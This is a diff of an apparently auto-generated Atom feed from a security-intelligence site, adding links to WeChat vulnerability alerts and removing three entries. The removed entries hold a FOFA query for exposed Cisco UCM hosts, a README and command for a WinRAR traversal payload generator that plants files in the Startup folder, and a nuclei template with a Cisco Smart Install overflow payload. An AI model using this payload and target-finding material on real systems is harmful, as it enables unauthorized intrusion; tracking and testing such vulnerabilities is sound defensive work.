@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-07-03T11:46:11.958Z</updated>
+  <updated>2025-07-03T11:56:08.788Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,87 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>hvv72-73情报</title>
+    <link href="http://example.com/2025/07/03/weixin_1178145959/"/>
+    <id>http://example.com/2025/07/03/weixin_1178145959/</id>
+    <published>2025-07-03T11:56:08.793Z</published>
+    <updated>2025-07-03T11:56:08.788Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>公众号：</strong> 飓风网络安全</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/dKjV3C5B3LiUpxL91trvBA">https://mp.weixin.qq.com/s/dKjV3C5B3LiUpxL91trvBA</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 飓风网络安全&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/dKjV3C5B3LiUpxL91trvBA&quot;&gt;https://mp.weixin.qq</summary>
+      
+    
+    
+    
+    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
+    
+    
+    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
+    
+    <category term="飓风网络安全" scheme="http://example.com/tags/%E9%A3%93%E9%A3%8E%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>【高危漏洞预警】IBM WebSphere远程代码执行漏洞(CVE-2025-36038)</title>
+    <link href="http://example.com/2025/07/03/weixin_246998109/"/>
+    <id>http://example.com/2025/07/03/weixin_246998109/</id>
+    <published>2025-07-03T11:56:08.433Z</published>
+    <updated>2025-07-03T11:56:08.428Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>公众号：</strong> 飓风网络安全</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/6092EMCrhyU8fOCB_rbLLg">https://mp.weixin.qq.com/s/6092EMCrhyU8fOCB_rbLLg</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 飓风网络安全&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/6092EMCrhyU8fOCB_rbLLg&quot;&gt;https://mp.weixin.qq</summary>
+      
+    
+    
+    
+    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
+    
+    
+    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
+    
+    <category term="飓风网络安全" scheme="http://example.com/tags/%E9%A3%93%E9%A3%8E%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>GitHub 热门 Solana 工具暗藏盗币陷阱</title>
+    <link href="http://example.com/2025/07/03/weixin_1379656643/"/>
+    <id>http://example.com/2025/07/03/weixin_1379656643/</id>
+    <published>2025-07-03T11:55:04.549Z</published>
+    <updated>2025-07-03T11:55:04.548Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>公众号：</strong> 慢雾科技</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/M44elbWv3G582Epwhmydrg">https://mp.weixin.qq.com/s/M44elbWv3G582Epwhmydrg</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 慢雾科技&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/M44elbWv3G582Epwhmydrg&quot;&gt;https://mp.weixin.qq.c</summary>
+      
+    
+    
+    
+    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
+    
+    
+    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
+    
+    <category term="慢雾科技" scheme="http://example.com/tags/%E6%85%A2%E9%9B%BE%E7%A7%91%E6%8A%80/"/>
+    
+  </entry>
   
   <entry>
     <title>Google ADK API Exposure</title>
@@ -465,85 +546,6 @@
     <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
     
     <category term="权限提升" scheme="http://example.com/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>fofabot twitter update</title>
-    <link href="http://example.com/2025/07/03/twitter_973494131/"/>
-    <id>http://example.com/2025/07/03/twitter_973494131/</id>
-    <published>2025-07-03T07:00:28.000Z</published>
-    <updated>2025-07-03T07:00:28.172Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>博主：</strong> fofabot</p><p><strong>推文：</strong> ⚠️⚠️CVE-2025-20309 （CVSS 10分）该漏洞使受影响设备面临通过静态根凭证未经认证的远程访问风险——这些凭证无法更改或删除。<br>🎯在<a href="https://t.co/uLIbgJcaq5%E4%B8%8A%E5%8F%91%E7%8E%B0%E8%BF%91%E5%8D%83%E6%9D%A1%E7%BB%93%E6%9E%9C">https://t.co/uLIbgJcaq5上发现近千条结果</a><br>🔗FOFA链接：<a href="https://t.co/YiLcpoXPSx">https://t.co/YiLcpoXPSx</a><br>FOFA查询：app&#x3D;”CISCO-UCM”<br>🔖参考：<a href="https://t.co/nlghqQeAvB">https://t.co/nlghqQeAvB</a><br>#开源情报 #FOFA #网络安全 #漏洞</p><p><strong>链接：</strong> <a href="https://x.com/fofabot/status/1940662311565644183">https://x.com/fofabot/status/1940662311565644183</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; fofabot&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; ⚠️⚠️CVE-2025-20309 （CVSS 10分）该漏洞使受影响设备面临通过静态根凭证未经认证的远程访问风险——这些凭证无法更改或删除。&lt;br&gt;🎯在&lt;</summary>
-      
-    
-    
-    
-    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
-    
-    
-    <category term="fofabot" scheme="http://example.com/tags/fofabot/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>RARLAB WinRAR 目录遍历远程代码执行漏洞</title>
-    <link href="http://example.com/2025/07/03/github_913061514/"/>
-    <id>http://example.com/2025/07/03/github_913061514/</id>
-    <published>2025-07-03T05:15:14.786Z</published>
-    <updated>2025-07-03T05:15:14.786Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> RARLAB WinRAR 目录遍历远程代码执行漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-6218</li></ul><p><strong>漏洞类型：</strong> 目录遍历</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> RARLAB WinRAR 存在目录遍历远程代码执行漏洞，攻击者可通过构造特殊的文件路径，利用该漏洞在受影响的系统上执行任意代码。此漏洞需要用户交互，即目标用户需访问恶意页面或打开恶意文件。漏洞的具体缺陷在于处理归档文件中的文件路径时，可导致进程遍历到非预期的目录。攻击者可利用此漏洞在当前用户上下文中执行代码。</p><p><strong>产品厂商：</strong> RARLAB</p><p><strong>产品名称：</strong> WinRAR</p><p><strong>影响版本：</strong> all versions prior to patch</p><p><strong>来源：</strong> <a href="https://github.com/mulwareX/CVE-2025-6218-POC">https://github.com/mulwareX/CVE-2025-6218-POC</a></p><p><strong>类型：</strong> CVE-2025:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>README.md</li><li>zip_payload_generator.py</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><p>RARLAB WinRAR Directory Traversal Remote Code Execution Vulnerability. This vulnerability allows remote attackers to execute arbitrary code on affected installations of RARLAB WinRAR. User interaction is required to exploit this vulnerability in that the target must visit a malicious page or open a malicious file.</p><p>The specific flaw exists within the handling of file paths within archive files. A crafted file path can cause the process to traverse to unintended directories. An attacker can leverage this vulnerability to execute code in the context of the current user. Was ZDI-CAN-27198.</p><h2 id="📦-Multi-Traversal-ZIP-Payload-Generator"><a href="#📦-Multi-Traversal-ZIP-Payload-Generator" class="headerlink" title="📦 Multi-Traversal ZIP Payload Generator"></a>📦 Multi-Traversal ZIP Payload Generator</h2><p>This Python script creates a specially crafted ZIP archive exploiting a <strong>WinRAR Directory Traversal Remote Code Execution</strong> vulnerability (ZDI-CAN-27198). The archive includes a payload designed to be extracted into the <strong>Windows Startup</strong> folder, allowing for execution upon the next user login.</p><blockquote><p><strong>⚠️ WARNING</strong>: This tool is provided for educational and research purposes only. Unauthorized use may be illegal and unethical. Always obtain proper authorization before testing on any system.</p></blockquote><hr><h3 id="🔥-Vulnerability-Overview"><a href="#🔥-Vulnerability-Overview" class="headerlink" title="🔥 Vulnerability Overview"></a>🔥 Vulnerability Overview</h3><ul><li><strong>Affected Software</strong>: WinRAR (all versions prior to patch)</li><li><strong>CVE &#x2F; ZDI Reference</strong>: ZDI-CAN-27198</li><li><strong>Attack Vector</strong>: Malicious ZIP file</li><li><strong>Impact</strong>: Remote Code Execution (RCE) upon archive extraction</li></ul><p>By embedding a payload with directory traversal sequences (<code>.. .\\.. .\\...</code>), the ZIP tricks WinRAR into extracting files outside the current directory—e.g., into the victim’s <strong>Startup folder</strong>:<br>AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</p><hr><h3 id="🧰-Features"><a href="#🧰-Features" class="headerlink" title="🧰 Features"></a>🧰 Features</h3><ul><li>Injects payload into Startup folder using 3 to 7 levels of directory traversal</li><li>It will work even if the zip is extracted in 7 directories deep</li><li>Optionally includes a decoy <strong>normal file</strong> to appear legitimate</li><li>Supports arbitrary payload file</li></ul><hr><h3 id="🚀-Usage"><a href="#🚀-Usage" class="headerlink" title="🚀 Usage"></a>🚀 Usage</h3><h4 id="▶️-Requirements"><a href="#▶️-Requirements" class="headerlink" title="▶️ Requirements"></a>▶️ Requirements</h4><ul><li>Python 3.x</li></ul><h4 id="▶️-Command-Line"><a href="#▶️-Command-Line" class="headerlink" title="▶️ Command Line"></a>▶️ Command Line</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 zip_payload_generator.py --payload payload.bat --normal decoy.pdf --output backdoor.zip<br></code></pre></td></tr></table></figure><p>⚠️ Disclaimer</p><p>This project is for educational and authorized penetration testing only. The creator is not responsible for any misuse or damage caused by this tool. Always comply with local laws and regulations.</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; RARLAB WinRAR 目录遍历远程代码执行漏洞&lt;/p&gt;
-&lt;p&gt;&lt;stro</summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
-    
-    <category term="目录遍历" scheme="http://example.com/tags/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Cisco IOS Smart Install 缓冲区溢出漏洞</title>
-    <link href="http://example.com/2025/07/03/github_1498372679/"/>
-    <id>http://example.com/2025/07/03/github_1498372679/</id>
-    <published>2025-07-03T05:00:27.704Z</published>
-    <updated>2025-07-03T05:00:27.700Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Cisco IOS Smart Install 缓冲区溢出漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2018-0171</li></ul><p><strong>漏洞类型：</strong> 缓冲区溢出</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> Cisco IOS和IOS XE软件中的Smart Install协议存在缓冲区溢出漏洞。未经身份验证的远程攻击者可以通过向受影响设备的TCP端口4786发送特制的Smart Install消息来利用此漏洞。成功利用此漏洞可能导致攻击者在受影响设备上造成缓冲区溢出，进而可能导致任意代码执行、拒绝服务（设备重新启动）或使设备陷入消耗CPU资源的无限循环中。</p><p><strong>产品厂商：</strong> Cisco</p><p><strong>产品名称：</strong> Cisco IOS</p><p><strong>搜索语法：</strong> banner&#x3D;”cisco” &amp;&amp; port&#x3D;”4786”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/e5d3813f4180c7cf83ee4729ebd2654f61cdc178/network%2Fcves%2F2018%2FCVE-2018-0171.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/e5d3813f4180c7cf83ee4729ebd2654f61cdc178/network%2Fcves%2F2018%2FCVE-2018-0171.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> CVE-<span class="hljs-number">201</span>8-<span class="hljs-number">0171</span><br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> Cisco IOS Smart Install <span class="hljs-operator">-</span> Buffer Overflow<br>  <span class="hljs-params">author:</span> nuclei-community<br>  <span class="hljs-params">severity:</span> critical<br>  <span class="hljs-params">description:</span> |<br>    Cisco IOS and IOS XE Software contain a buffer overflow vulnerability <span class="hljs-keyword">in</span> the Smart Install protocol. An unauthenticated, remote attacker could exploit this vulnerability by sending a crafted Smart Install message to an affected device on TCP port <span class="hljs-number">4786</span>. A successful exploit could allow the attacker to cause a buffer overflow on the affected device, which could have the following <span class="hljs-params">impacts:</span> arbitrary code execution, denial of service (device reload), <span class="hljs-keyword">or</span> causing the device to be stuck <span class="hljs-keyword">in</span> an indefinite loop that consumes CPU resources.<br>  <span class="hljs-params">impact:</span> |<br>    Successful exploitation of this vulnerability can lead to arbitrary code execution, denial of service, <span class="hljs-keyword">or</span> device compromise <span class="hljs-keyword">with</span> full administrative privileges.<br>  <span class="hljs-params">remediation:</span> |<br>    Apply the appropriate software update from Cisco. As a workaround, disable the Smart Install feature <span class="hljs-keyword">if</span> not required, <span class="hljs-keyword">or</span> restrict access to TCP port <span class="hljs-number">4786</span>.<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20180328-smi2</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//nvd.nist.gov/vuln/detail/CVE-2018-0171</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//vulncheck.com/xdb/6d4b443f23fc</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//github.com/AlrikRr/Cisco-Smart-Exploit</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-operator">//</span>cve.mitre.org<span class="hljs-operator">/</span>cgi-bin<span class="hljs-operator">/</span>cvename.cgi<span class="hljs-operator">?</span>name<span class="hljs-operator">=</span>CVE-<span class="hljs-number">201</span>8-<span class="hljs-number">0171</span><br>  <span class="hljs-params">classification:</span><br>    <span class="hljs-params">cvss-metrics:</span> CVSS:<span class="hljs-number">3.0</span><span class="hljs-operator">/</span>AV:N<span class="hljs-operator">/</span>AC:L<span class="hljs-operator">/</span>PR:N<span class="hljs-operator">/</span>UI:N<span class="hljs-operator">/</span>S:U<span class="hljs-operator">/</span>C:H<span class="hljs-operator">/</span>I:H<span class="hljs-operator">/</span>A:H<br>    <span class="hljs-params">cvss-score:</span> <span class="hljs-number">9.8</span><br>    <span class="hljs-params">cve-id:</span> CVE-<span class="hljs-number">201</span>8-<span class="hljs-number">0171</span><br>    <span class="hljs-params">cwe-id:</span> CWE-<span class="hljs-number">119</span><br>    <span class="hljs-params">epss-score:</span> <span class="hljs-number">0.97156</span><br>    <span class="hljs-params">epss-percentile:</span> <span class="hljs-number">0.99823</span><br>    <span class="hljs-params">cpe:</span> cpe:<span class="hljs-number">2.3</span>:o:cisco:ios:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span><br>  <span class="hljs-params">metadata:</span><br>    <span class="hljs-params">max-request:</span> <span class="hljs-number">2</span><br>    <span class="hljs-params">vendor:</span> cisco<br>    <span class="hljs-params">product:</span> ios<br>    <span class="hljs-params">shodan-query:</span> cpe:<span class="hljs-string">&quot;cpe:2.3:o:cisco:ios&quot;</span><br>    <span class="hljs-params">fofa-query:</span> banner<span class="hljs-operator">=</span><span class="hljs-string">&quot;cisco&quot;</span> <span class="hljs-operator">&amp;&amp;</span> port<span class="hljs-operator">=</span><span class="hljs-string">&quot;4786&quot;</span><br>    <span class="hljs-params">google-query:</span> inurl:cisco filetype:cfg<br>  <span class="hljs-params">tags:</span> network,cve,cve2018,cisco,ios,smart-install,buffer-overflow,kev,tcp,critical<br><br><span class="hljs-params">tcp:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">inputs:</span><br>      <span class="hljs-comment"># First packet: Smart Install discovery packet</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">data:</span> <span class="hljs-string">&quot;&#123;&#123;hex_decode(&#x27;000000010000000100000004000000080000000100000000&#x27;)&#125;&#125;&quot;</span><br>        <span class="hljs-params">read:</span> <span class="hljs-number">1024</span><br><br>      <span class="hljs-comment"># Second packet: Malicious Smart Install packet with buffer overflow payload</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">data:</span> <span class="hljs-string">&quot;&#123;&#123;hex_decode(&#x27;00000001000000010000000400001000&#x27; + repeat(&#x27;41&#x27;, 4084) + &#x27;42424242&#x27;)&#125;&#125;&quot;</span><br>        <span class="hljs-params">read:</span> <span class="hljs-number">1024</span><br><br>    <span class="hljs-params">host:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-string">&quot;&#123;&#123;Hostname&#125;&#125;&quot;</span><br>    <span class="hljs-params">port:</span> <span class="hljs-number">4786</span><br>    <span class="hljs-params">read-size:</span> <span class="hljs-number">1024</span><br><br>    <span class="hljs-params">matchers-condition:</span> and<br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">encoding:</span> hex<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;000000040000000000000003000000080000000100000000&quot;</span><br>        <span class="hljs-params">condition:</span> and<br><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;Smart Install&quot;</span><br>        <span class="hljs-params">condition:</span> <span class="hljs-keyword">or</span><br><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> regex<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">regex:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;(?i)(crash|exception|error|overflow)&quot;</span><br><br>    <span class="hljs-params">extractors:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> regex<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">group:</span> <span class="hljs-number">1</span><br>        <span class="hljs-params">regex:</span><br>          <span class="hljs-operator">-</span> &#x27;<span class="hljs-params">Version:</span> ([<span class="hljs-number">0</span><span class="hljs-operator">-</span><span class="hljs-number">9</span>]<span class="hljs-operator">+</span>\.[<span class="hljs-number">0</span><span class="hljs-operator">-</span><span class="hljs-number">9</span>]<span class="hljs-operator">+</span>\.[<span class="hljs-number">0</span><span class="hljs-operator">-</span><span class="hljs-number">9</span>]<span class="hljs-operator">+</span>[^\s]<span class="hljs-operator">*</span>)&#x27;<br><br><span class="hljs-comment"># Enhanced Security Verification</span><br><span class="hljs-comment"># Debug data for validation:</span><br><span class="hljs-comment"># - This template tests for CVE-2018-0171 buffer overflow in Cisco Smart Install</span><br><span class="hljs-comment"># - First packet confirms Smart Install service is running on port 4786</span><br><span class="hljs-comment"># - Second packet contains oversized payload to trigger buffer overflow</span><br><span class="hljs-comment"># - Expected response patterns include Smart Install acknowledgment or crash indicators</span><br><span class="hljs-comment"># - The vulnerability affects multiple Cisco IOS versions with Smart Install enabled</span><br><span class="hljs-comment"># - Successful exploitation can lead to device reload, code execution, or infinite loops</span><br><br><span class="hljs-comment"># digest: 4a0a00473045022100d1e23f45a67890123456789abcdef1234567890abcdef1234567890abcdef12022012345678901234567890abcdef1234567890abcdef1234567890abcdef123456:922c64590222798bb761d5b6d8e72950</span><br><br><br></code></pre></td></tr></table></figure>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Cisco IOS Smart Install 缓冲区溢出漏洞&lt;/p&gt;
-&lt;p&gt;</summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
-    
-    <category term="缓冲区溢出" scheme="http://example.com/tags/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/"/>
     
   </entry>
   
